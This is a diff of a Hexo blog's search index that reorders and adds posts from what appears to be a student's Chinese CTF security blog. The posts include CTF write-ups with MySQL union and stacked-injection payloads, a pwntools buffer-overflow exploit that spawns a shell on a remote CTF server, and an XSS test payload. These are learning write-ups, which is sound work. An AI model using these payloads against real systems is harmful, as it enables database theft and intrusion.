@@ -1,17 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Hello world!</title>
-    <url>/2022/01/16/blog0000-hello-world/</url>
-    <content><![CDATA[<h2 id="写在前面的一些话"><a href="#写在前面的一些话" class="headerlink" title="写在前面的一些话"></a>写在前面的一些话</h2><p>Welcome to my blog!</p>
-<span id="more"></span>
-<p>这里是whistleH的博客世界，开这个博客的最初目的是大一暑假学的东西太多太杂，希望自己搭一个博客来记录一下自己学习历程。</p>
-]]></content>
-      <tags>
-        <tag>preface</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>RCE中的绕过总结（持续更新中）</title>
     <url>/2021/09/14/blog0001-rce%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<h2 id="一、空格绕过"><a href="#一、空格绕过" class="headerlink" title="一、空格绕过"></a>一、空格绕过</h2><h3 id="1、URL编码绕过"><a href="#1、URL编码绕过" class="headerlink" title="1、URL编码绕过"></a>1、URL编码绕过</h3><p>空格在URL编码中为%20</p>
@@ -104,23 +93,44 @@
       </tags>
   </entry>
   <entry>
-    <title>HCTF-warmup-目录穿越</title>
-    <url>/2022/01/16/blog0005-HCTF-warmup-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/</url>
-    <content><![CDATA[<h2 id="一、题目重点"><a href="#一、题目重点" class="headerlink" title="一、题目重点"></a>一、题目重点</h2><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/wp/LFIHCTF-LFI-wp.png" alt="题目图片"></p>
-<p>我们首先来看一下</p>
+    <title>Hello world!</title>
+    <url>/2022/01/16/blog0000-hello-world/</url>
+    <content><![CDATA[<h2 id="写在前面的一些话"><a href="#写在前面的一些话" class="headerlink" title="写在前面的一些话"></a>写在前面的一些话</h2><p>Welcome to my blog!</p>
 <span id="more"></span>
+<p>这里是whistleH的博客世界，开这个博客的最初目的是大一暑假学的东西太多太杂，希望自己搭一个博客来记录一下自己学习历程。</p>
+]]></content>
+      <tags>
+        <tag>preface</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MySQL注入的姿势</title>
+    <url>/2021/11/12/blog0002-sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<h2 id="一、联合查询"><a href="#一、联合查询" class="headerlink" title="一、联合查询"></a>一、联合查询</h2><h3 id="1、基本说明"><a href="#1、基本说明" class="headerlink" title="1、基本说明"></a>1、基本说明</h3><p>SQL注入中最经典的就是联合查询，先上经典三板斧</p>
+<p>联合注入的手段还是很多的，但是都大同小异，主要还是从information_schema这个存放mysql信息的数据库下手。</p>
+<span id="more"></span>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破库名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破表名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;&#123;table_name&#125;&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破列名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;&#123;table_name&#125;&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破内容</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">select</span> group_concat(<span class="number">0x5c</span>,<span class="keyword">column</span>,<span class="number">0x5c</span>,<span class="keyword">column</span>) <span class="keyword">from</span> &#123;database_name&#125;.&#123;table_name&#125;</span><br></pre></td></tr></table></figure>
+<p>联合查询是入门的SQL注入姿势，通常只有面对没有部署任何waf的Web才能奏效。</p>
+<h3 id="2、补充"><a href="#2、补充" class="headerlink" title="2、补充"></a>2、补充</h3><p>在联合查询时，我们构造payload要注意让前一个查询语句没有查询结果。</p>
+<p>这是在实际情况中，往往Web只会显示查询到的第一条信息，</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">union</span> ......</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span></span><br></pre></td></tr></table></figure>
+<p>这里我们可以清楚发现前者屏蔽了正常查询的结果，使得我们的payload注入结果能够正常显示。</p>
+<h2 id="二、堆叠注入"><a href="#二、堆叠注入" class="headerlink" title="二、堆叠注入"></a>二、堆叠注入</h2><h3 id="1、说明"><a href="#1、说明" class="headerlink" title="1、说明"></a>1、说明</h3><p>堆叠注入的经典案例就是强网杯2019的“随便注”（XCTF和BUUOJ都有环境复现</p>
+<p>大致的原理和RCE中的管道运算符注入一样。</p>
+<h3 id="2、补充-1"><a href="#2、补充-1" class="headerlink" title="2、补充"></a>2、补充</h3><p>先上”随便注”的payload</p>
+<p>这里过滤了select 和 prepare，后者大小写非常好绕过（不用正则还是太年轻</p>
+<p>前者我们这里使用了设置变量的方法，成功绕过了select的注入问题</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="variable">@sql</span><span class="operator">=</span>concat(<span class="string">&#x27;sel&#x27;</span>,<span class="string">&#x27;ect * from `1919810931114514`&#x27;</span>);<span class="keyword">Prepare</span> uut <span class="keyword">from</span> <span class="variable">@sql</span>; <span class="keyword">execute</span> uut;  <span class="comment">-- - </span></span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>ctf</category>
         <category>web</category>
-        <category>wp</category>
-        <category>LFI</category>
+        <category>sql</category>
       </categories>
       <tags>
         <tag>ctf</tag>
         <tag>web</tag>
-        <tag>wp</tag>
-        <tag>LFI</tag>
+        <tag>sql</tag>
       </tags>
   </entry>
   <entry>
@@ -160,6 +170,26 @@
       </tags>
   </entry>
   <entry>
+    <title>HCTF-warmup-目录穿越</title>
+    <url>/2022/01/16/blog0005-HCTF-warmup-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/</url>
+    <content><![CDATA[<h2 id="一、题目重点"><a href="#一、题目重点" class="headerlink" title="一、题目重点"></a>一、题目重点</h2><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/wp/LFIHCTF-LFI-wp.png" alt="题目图片"></p>
+<p>我们首先来看一下</p>
+<span id="more"></span>
+]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>web</category>
+        <category>wp</category>
+        <category>LFI</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>wp</tag>
+        <tag>LFI</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>leetcode-分治-为运算表达式设计优先级</title>
     <url>/2022/03/27/blog0006-leetcode-%E5%88%86%E6%B2%BB-%E4%B8%BA%E8%BF%90%E7%AE%97%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AE%BE%E8%AE%A1%E4%BC%98%E5%85%88%E7%BA%A7/</url>
     <content><![CDATA[<h2 id="一、题目描述"><a href="#一、题目描述" class="headerlink" title="一、题目描述"></a>一、题目描述</h2><p>给你一个由数字和运算符组成的字符串 <code>expression</code> ，按不同优先级组合数字和运算符，计算并返回所有可能组合的结果。你可以 <strong>按任意顺序</strong> 返回答案</p>
@@ -192,36 +222,6 @@
         <tag>leetcode</tag>
         <tag>算法</tag>
         <tag>题解</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>MySQL注入的姿势</title>
-    <url>/2021/11/12/blog0002-sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<h2 id="一、联合查询"><a href="#一、联合查询" class="headerlink" title="一、联合查询"></a>一、联合查询</h2><h3 id="1、基本说明"><a href="#1、基本说明" class="headerlink" title="1、基本说明"></a>1、基本说明</h3><p>SQL注入中最经典的就是联合查询，先上经典三板斧</p>
-<p>联合注入的手段还是很多的，但是都大同小异，主要还是从information_schema这个存放mysql信息的数据库下手。</p>
-<span id="more"></span>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破库名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破表名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;&#123;table_name&#125;&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破列名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;&#123;table_name&#125;&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破内容</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">select</span> group_concat(<span class="number">0x5c</span>,<span class="keyword">column</span>,<span class="number">0x5c</span>,<span class="keyword">column</span>) <span class="keyword">from</span> &#123;database_name&#125;.&#123;table_name&#125;</span><br></pre></td></tr></table></figure>
-<p>联合查询是入门的SQL注入姿势，通常只有面对没有部署任何waf的Web才能奏效。</p>
-<h3 id="2、补充"><a href="#2、补充" class="headerlink" title="2、补充"></a>2、补充</h3><p>在联合查询时，我们构造payload要注意让前一个查询语句没有查询结果。</p>
-<p>这是在实际情况中，往往Web只会显示查询到的第一条信息，</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">union</span> ......</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span></span><br></pre></td></tr></table></figure>
-<p>这里我们可以清楚发现前者屏蔽了正常查询的结果，使得我们的payload注入结果能够正常显示。</p>
-<h2 id="二、堆叠注入"><a href="#二、堆叠注入" class="headerlink" title="二、堆叠注入"></a>二、堆叠注入</h2><h3 id="1、说明"><a href="#1、说明" class="headerlink" title="1、说明"></a>1、说明</h3><p>堆叠注入的经典案例就是强网杯2019的“随便注”（XCTF和BUUOJ都有环境复现</p>
-<p>大致的原理和RCE中的管道运算符注入一样。</p>
-<h3 id="2、补充-1"><a href="#2、补充-1" class="headerlink" title="2、补充"></a>2、补充</h3><p>先上”随便注”的payload</p>
-<p>这里过滤了select 和 prepare，后者大小写非常好绕过（不用正则还是太年轻</p>
-<p>前者我们这里使用了设置变量的方法，成功绕过了select的注入问题</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="variable">@sql</span><span class="operator">=</span>concat(<span class="string">&#x27;sel&#x27;</span>,<span class="string">&#x27;ect * from `1919810931114514`&#x27;</span>);<span class="keyword">Prepare</span> uut <span class="keyword">from</span> <span class="variable">@sql</span>; <span class="keyword">execute</span> uut;  <span class="comment">-- - </span></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>ctf</category>
-        <category>web</category>
-        <category>sql</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>sql</tag>
       </tags>
   </entry>
   <entry>
@@ -261,7 +261,7 @@
 <p>没有PIE，这很好，我们可以再进一步尝试看看，丢到IDA里面，发现函数内有 call  system 和 read，这给了我们布栈的空间。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0804844b &lt;+0&gt;:	push   ebp</span><br><span class="line">0x0804844c &lt;+1&gt;:	mov    ebp,esp</span><br><span class="line">0x0804844e &lt;+3&gt;:	sub    esp,0x88</span><br><span class="line">0x08048454 &lt;+9&gt;:	sub    esp,0xc</span><br><span class="line">0x08048457 &lt;+12&gt;:	push   0x8048540</span><br><span class="line">0x0804845c &lt;+17&gt;:	call   0x8048320 &lt;system@plt&gt;</span><br><span class="line">0x08048461 &lt;+22&gt;:	add    esp,0x10</span><br><span class="line">0x08048464 &lt;+25&gt;:	sub    esp,0x4</span><br><span class="line">0x08048467 &lt;+28&gt;:	push   0x100</span><br><span class="line">0x0804846c &lt;+33&gt;:	lea    eax,[ebp-0x88]	//read 写入的内存起点</span><br><span class="line">0x08048472 &lt;+39&gt;:	push   eax</span><br><span class="line">0x08048473 &lt;+40&gt;:	push   0x0</span><br><span class="line">0x08048475 &lt;+42&gt;:	call   0x8048310 &lt;read@plt&gt;</span><br><span class="line">0x0804847a &lt;+47&gt;:	add    esp,0x10</span><br><span class="line">0x0804847d &lt;+50&gt;:	nop</span><br><span class="line">0x0804847e &lt;+51&gt;:	leave  </span><br><span class="line">0x0804847f &lt;+52&gt;:	ret  </span><br></pre></td></tr></table></figure>
 <p>从这里我们可以分析出来，我们读入0x88 + 0x04 字节，覆盖ebp -&gt; 写入 call system（0x0804845c）-&gt; 写入 “/bin/sh”的地址。</p>
-<p>当ret时，我们回到了call   0x8048320 <a href="&#x6d;&#x61;&#105;&#108;&#116;&#x6f;&#x3a;&#x73;&#x79;&#x73;&#116;&#101;&#109;&#x40;&#112;&#x6c;&#x74;">&#x73;&#x79;&#x73;&#116;&#101;&#109;&#x40;&#112;&#x6c;&#x74;</a>，此时esp由于pop eip的效果，此时内部存放着”/bin/sh”的地址，这也顺利地完成了system函数的参数布置。</p>
+<p>当ret时，我们回到了call   0x8048320 <a href="&#x6d;&#97;&#105;&#108;&#116;&#x6f;&#x3a;&#x73;&#121;&#115;&#x74;&#x65;&#109;&#64;&#112;&#108;&#116;">&#x73;&#121;&#115;&#x74;&#x65;&#109;&#64;&#112;&#108;&#116;</a>，此时esp由于pop eip的效果，此时内部存放着”/bin/sh”的地址，这也顺利地完成了system函数的参数布置。</p>
 <p>Python的exp如下：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 111.200.241.244:65392</span></span><br><span class="line">io = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="string">&quot;65392&quot;</span>)</span><br><span class="line"><span class="comment"># io = process(&quot;./xctf_2&quot;)</span></span><br><span class="line"></span><br><span class="line">dam=<span class="string">&quot;Input:\n&quot;</span></span><br><span class="line">ret_addr = <span class="number">0x804845c</span></span><br><span class="line">bin_addr = <span class="number">0x804a024</span></span><br><span class="line">fill_num = <span class="number">0x88</span> + <span class="number">0x4</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*fill_num + p32(ret_addr) + p32(bin_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(dam,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <h2 id="二、guess-num"><a href="#二、guess-num" class="headerlink" title="二、guess_num"></a>二、guess_num</h2><p>这道题有点意思，丢到ida里面就可以发现这是一个猜随机数的题。</p>
@@ -288,6 +288,32 @@
         <tag>wp</tag>
         <tag>xctf</tag>
         <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hacker101系列wp（持续更新中）</title>
+    <url>/2022/03/29/blog0009-hacker101%E7%B3%BB%E5%88%97wp%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="一、Micro-CMS-v1"><a href="#一、Micro-CMS-v1" class="headerlink" title="一、Micro-CMS v1"></a>一、Micro-CMS v1</h2><p>这道题有4个flag，我们逐个分解。</p>
+<span id="more"></span>
+<p>首先一进来，页面异常简洁，直接Ctrl+U，观察一下全局，url中page带数字。</p>
+<p>其实一般来说page含数字的，我们可以考虑一下是不是有文件包含（include）或者注入点（查询）。</p>
+<p>我们尝试url注入，在page处加上一个引号封闭一下，果然弹出来第一个flag。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://19d516b0310286729dd8449820bfdb6f.ctf.hacker101.com/page/edit/1&#x27;</span><br></pre></td></tr></table></figure>
+<p>接下来，我们进入test页面，发现这里留了一个留言板，非常有XSS的暗示性，我们直接上手来一个</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>有意思的是，这个留言板在后端显然把script过滤了，并且值给了我们</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>web</category>
+        <category>wp</category>
+        <category>comprehensive</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>wp</tag>
+        <tag>hacker101</tag>
       </tags>
   </entry>
 </search>
